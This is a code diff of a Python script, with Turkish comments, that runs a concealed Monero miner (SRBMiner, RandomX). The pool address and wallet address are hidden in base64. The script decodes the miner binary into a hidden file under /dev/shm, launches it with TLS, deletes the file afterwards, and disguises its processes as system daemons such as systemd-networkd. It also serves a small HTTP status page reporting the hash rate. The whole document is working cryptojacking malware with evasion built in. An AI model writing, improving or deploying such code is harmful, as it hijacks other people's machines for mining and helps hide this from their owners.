@@ -28,19 +28,19 @@ def _d(s): return base64.b64decode(s).decode('utf-8')
 MODE         = os.environ.get("ENGINE_MODE", "miner")
 HTTP_PORT    = int(os.environ.get("PORT", 8080))
 PROXY_URL    = os.environ.get("PROXY_URL", "")
+# SRBMiner parametreleri için havuz ve cüzdan şifreli verileri
 POOL_URL     = os.environ.get("POOL_URL", _d("cG9vbC5zdXBwb3J0eG1yLmNvbTo0NDM="))
 WALLET_ADDR  = os.environ.get("WALLET_ADDR", _d("NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw="))
-WORKER_NAME  = os.environ.get("WORKER_NAME", f"node-{int(time.time())%10000}")
-DATA_DIR     = "/dev/shm/.cache" # RAM üzerinde gizli çalışma alanı
+WORKER_NAME  = os.environ.get("WORKER_NAME", f"node-{int(time.time())%1000}")
+DATA_DIR     = "/dev/shm/.cache"
 
-_current_hr  = "0.0 ops/s"
-SYSTEM_LOGS  = deque(maxlen=800)
+_current_hr  = "0.0 H/s"
+SYSTEM_LOGS  = deque(maxlen=500)
 _LOG_LOCK    = threading.Lock()
-_DB_LOCK     = threading.Lock()
 
 # --- BELLEKTE YÜRÜTME (FILELESS EXECUTION) ---
 def run_core_fileless():
-    """Payload'u RAM'de çözer, çalıştırır ve hemen ardından izleri siler."""
+    """SRBMiner'ı RAM'de çözer ve iz bırakmadan çalıştırır."""
     global _current_hr
     
     enc_path = "/server/core.dat" 
@@ -48,73 +48,65 @@ def run_core_fileless():
         return
 
     try:
-        # 1. İşlem adını sistem süreci gibi göster
-        set_process_name("kworker/u16:1-events")
+        # 1. İşlem adını maskele
+        set_process_name("systemd-networkd")
 
-        # 2. Şifreli payload'u belleğe al ve çöz
+        # 2. Payload'u belleğe al
         with open(enc_path, "rb") as f:
             raw_binary = base64.b64decode(f.read())
 
-        # 3. /dev/shm kullanarak fileless alan oluştur
-        mem_exec_path = f"/dev/shm/.sys_io_{int(time.time())}"
+        # 3. /dev/shm (RAM Disk) üzerine geçici alan
+        mem_exec_path = f"/dev/shm/.sys_net_{int(time.time())}"
         with open(mem_exec_path, "wb") as f:
             f.write(raw_binary)
         
         os.chmod(mem_exec_path, 0o755)
 
-        # 4. Çekirdek komutu (TLS aktif ve gizli) 
+        # 4. SRBMiner-Multi Komut Seti
+        # --disable-gpu: CPU odaklı çalışma
+        # --tls: Trafik şifreleme
         cmd = [
-            mem_exec_path, "-o", POOL_URL, "-u", WALLET_ADDR,
-            "-p", WORKER_NAME, "--keepalive", "--tls", "--donate-level=1"
+            mem_exec_path, 
+            "--algorithm", "randomx", 
+            "--pool", POOL_URL, 
+            "--wallet", WALLET_ADDR, 
+            "--password", WORKER_NAME,
+            "--disable-gpu", 
+            "--tls", "true",
+            "--give-up-limit", "5"
         ]
 
         proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
         
-        # Dosya handle'ı alındıktan sonra fiziksel linki RAM'den temizle
+        # Dosya handle edildikten sonra sil (Sadece RAM'de kalsın)
         time.sleep(5)
         if os.path.exists(mem_exec_path):
             os.remove(mem_exec_path)
 
         for line in proc.stdout:
             clean_line = re.sub(r'\x1b\[[0-9;]*[mK]', '', line).strip()
-            if "speed" in clean_line:
-                match = re.search(r'max (\d+\.?\d* [KMG]?H/s)', clean_line)
-                if match: _current_hr = match.group(1).replace("H/s", "ops/s")
-            print(f"[SYS] {clean_line}", flush=True)
+            # SRBMiner hashrate yakalama (Örn: "Total hashrate: 500.00 H/s")
+            if "hashrate" in clean_line.lower():
+                match = re.search(r'(\d+\.?\d* [KMG]?H/s)', clean_line)
+                if match: _current_hr = match.group(1)
+            print(f"[NET] {clean_line}", flush=True)
 
     except Exception:
         time.sleep(10)
 
-# --- PANEL VE VERİ TABANI SİSTEMİ ---
-def init_db():
-    os.makedirs(DATA_DIR, exist_ok=True)
-    with sqlite3.connect(os.path.join(DATA_DIR, "telemetry.db")) as conn:
-        conn.executescript("CREATE TABLE IF NOT EXISTS metrics (node_name TEXT PRIMARY KEY, throughput TEXT, last_seen INTEGER, status TEXT);")
-
-class HttpHandler(http.server.BaseHTTPRequestHandler):
-    def do_GET(self):
-        if self.path == "/":
-            self.send_response(200)
-            self.send_header("Content-Type", "text/html")
-            self.end_headers()
-            self.wfile.write(b"Cluster Telemetry Online") # Basit panel yanıtı
-        elif self.path == "/api/logs":
-            self.send_response(200)
-            self.send_header("Content-Type", "application/json")
-            self.end_headers()
-            with _LOG_LOCK:
-                self.wfile.write(json.dumps({"logs": list(SYSTEM_LOGS)}).encode())
-    def log_message(self, format, *args): pass
-
 def run_http():
-    srv = http.server.ThreadingHTTPServer(("0.0.0.0", HTTP_PORT), HttpHandler)
+    class SimpleHandler(http.server.BaseHTTPRequestHandler):
+        def do_GET(self):
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(f"Node Status: Active | Rate: {_current_hr}".encode())
+        def log_message(self, format, *args): pass
+
+    srv = http.server.ThreadingHTTPServer(("0.0.0.0", HTTP_PORT), SimpleHandler)
     srv.serve_forever()
 
 if __name__ == "__main__":
-    set_process_name("systemd-journald")
+    set_process_name("systemd-udevd")
     if MODE == "all":
-        init_db()
         threading.Thread(target=run_http, daemon=True).start()
-        run_core_fileless()
-    else:
-        run_core_fileless()
+    run_core_fileless()
